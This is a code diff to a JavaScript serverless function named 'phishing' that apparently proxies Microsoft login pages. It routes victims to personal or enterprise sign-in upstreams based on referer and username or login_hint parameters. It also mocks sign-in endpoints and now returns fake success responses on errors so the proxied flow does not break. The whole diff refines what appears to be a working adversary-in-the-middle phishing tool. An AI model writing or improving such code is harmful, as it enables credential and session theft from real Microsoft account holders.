@@ -53,17 +53,23 @@ function getUpstreamDomain(request, original_url) {
   const referer = request.headers.get('referer') || '';
   
   // Check if this is a redirect from login.live.com or contains personal account indicators
-  if (referer.includes('login.live.com') || 
-      original_url.searchParams.has('username') && 
-      (original_url.searchParams.get('username').includes('@outlook.com') || 
-       original_url.searchParams.get('username').includes('@hotmail.com') ||
-       original_url.searchParams.get('username').includes('@live.com'))) {
+  if (referer.includes('login.live.com')) {
     return upstream_personal;
+  }
+  
+  // Check username parameter (URL decoded)
+  if (original_url.searchParams.has('username')) {
+    const username = decodeURIComponent(original_url.searchParams.get('username'));
+    if (username.includes('@outlook.com') || 
+        username.includes('@hotmail.com') ||
+        username.includes('@live.com')) {
+      return upstream_personal;
+    }
   }
   
   // Check URL parameters that might indicate personal account flow
   if (original_url.searchParams.has('login_hint')) {
-    const loginHint = original_url.searchParams.get('login_hint');
+    const loginHint = decodeURIComponent(original_url.searchParams.get('login_hint'));
     if (loginHint.includes('@outlook.com') || 
         loginHint.includes('@hotmail.com') || 
         loginHint.includes('@live.com')) {
@@ -134,14 +140,15 @@ app.http("phishing", {
     
     // Enhanced mock responses based on domain type
     if (isCriticalEndpoint) {
-      context.log(`Mocking critical endpoint: ${original_url.pathname} for domain: ${selected_upstream}`);
-      
-      // Determine if this is a personal account (login.live.com) or enterprise
-      const isPersonalAccount = selected_upstream === "login.live.com";
-      
-      // Return mock successful responses for critical endpoints
-      let mockResponse = "";
-      let mockHeaders = new Headers();
+      try {
+        context.log(`Mocking critical endpoint: ${original_url.pathname} for domain: ${selected_upstream}`);
+        
+        // Determine if this is a personal account (login.live.com) or enterprise
+        const isPersonalAccount = selected_upstream === "login.live.com";
+        
+        // Return mock successful responses for critical endpoints
+        let mockResponse = "";
+        let mockHeaders = new Headers();
       
       if (original_url.pathname.includes('/GetExperimentAssignments.srf')) {
         if (isPersonalAccount) {
@@ -327,10 +334,30 @@ app.http("phishing", {
         context.log(`[${getCurrentTimestamp()}] 📝 Mock Response Preview: ${mockResponse.substring(0, 200)}...`);
       }
       
-      return new Response(mockResponse, {
-        status: 200,
-        headers: mockHeaders,
-      });
+        return new Response(mockResponse, {
+          status: 200,
+          headers: mockHeaders,
+        });
+      } catch (error) {
+        context.error(`Error in mock endpoint handling: ${error.message}`);
+        context.error(`Stack trace: ${error.stack}`);
+        context.error(`URL: ${original_url.pathname}`);
+        context.error(`Domain: ${selected_upstream}`);
+        
+        // Return a basic success response even on error to prevent 500s
+        return new Response(JSON.stringify({
+          "success": true,
+          "experiments": [],
+          "status": "success"
+        }), {
+          status: 200,
+          headers: new Headers({
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": "*",
+            "Access-Control-Allow-Credentials": "true"
+          })
+        });
+      }
     }
     
     // Rewriting to appropriate Microsoft domain
